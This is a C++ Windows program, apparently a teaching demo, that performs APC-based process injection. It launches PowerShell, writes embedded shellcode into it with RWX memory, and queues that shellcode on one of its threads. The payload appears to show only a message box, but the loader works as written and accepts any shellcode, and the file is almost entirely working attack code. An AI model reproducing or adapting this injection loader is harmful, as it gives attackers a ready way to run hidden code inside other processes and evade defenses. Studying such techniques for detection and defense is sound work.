#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
#include <chrono>
#include <thread>

const char* k = "[+]";
const char* e = "[-]";

unsigned char shellcode[] = {
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
    "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
    "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
    "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
    "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
    "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
    "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
    "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
    "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
    "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
    "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
    "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
    "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
    "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
    "\x8d\x8d\x34\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
    "\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
    "\x00\x3e\x4c\x8d\x85\x22\x01\x00\x00\x48\x31\xc9\x41\xba"
    "\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
    "\x56\xff\xd5\x49\x6e\x6a\x65\x63\x74\x69\x6f\x6e\x20\x73"
    "\x75\x63\x63\x65\x73\x66\x75\x6c\x00\x50\x72\x6f\x63\x65"
    "\x73\x73\x20\x49\x6e\x6a\x65\x63\x74\x69\x6f\x6e\x00\x75"
    "\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00"
};

int main() {
	HANDLE victimProcess = NULL;
	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
	std::vector<DWORD> threadIds;
	SIZE_T shellSize = sizeof(shellcode);
	HANDLE threadHandle = NULL;

	printf("%s To start, we will open the Microsoft Powrshell\n", k);
	system("pause");

	STARTUPINFOA si = { sizeof(si) };
	PROCESS_INFORMATION pi;

	// - Start the victim process
	LPCSTR command = "powershell.exe -NoExit";  // Opens PowerShell and keeps it open

	// Start the Powershell process
	int status = CreateProcessA(NULL, // Application name
		(LPSTR)command,   // Command line arguments
		NULL,   // Process handle not inheritable
		NULL,   // Thread handle not inheritable
		FALSE,  // Set handle inheritance to FALSE
		CREATE_NEW_CONSOLE,      // No creation flags
		NULL,   // Use parent's environment block
		NULL,   // Use parent's starting directory 
		&si,    // Pointer to STARTUPINFO structure
		&pi);    // Pointer to PROCESS_INFORMATION structure

	victimProcess = pi.hProcess;
	printf("%s PID %ld\n", k, pi.dwProcessId);
	system("pause");
	if (!status) {
		printf("%s failed open process, error: %ld", e, GetLastError());
		return EXIT_FAILURE;
	}

	// - SECTION 1: Take Snapshot of the running Threads
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);

	// - SECTION 2: Allocate memory space
	printf("%s Now, we will allocate the memory for our injection\n", k);
	system("pause");
	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	printf("%s allocated %zu-bytes with rwx permissions on address: 0x%p\n", k, sizeof(shellcode), shellAddress);
	system("pause");

	// - SECTION 3: Write Memory space
	BOOL writeResult = WriteProcessMemory(victimProcess, shellAddress, shellcode, shellSize, NULL);
	if (!writeResult) {
		printf("%s Failed to write shellcode. Error: %ld\n", e, GetLastError());
		return EXIT_FAILURE;
	}

	// - SECTION 4: List the threads of the victim process
	if (Thread32First(snapshot, &threadEntry)) {
		do {
			if (threadEntry.th32OwnerProcessID == pi.dwProcessId) {
				threadIds.push_back(threadEntry.th32ThreadID);
			}
		} while (Thread32Next(snapshot, &threadEntry));
	}

	// - SECTION 5: Queue the shellcode in the threads APC queues for execution
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
	for (DWORD threadId : threadIds) {
		printf("%s Queueing APC on the thread: %ld\n", k, threadId);
		threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
		QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
		
		// For demonstration purposes, we will only inject one thread of the process
		break;
	}
	system("pause");

	return 0;
}
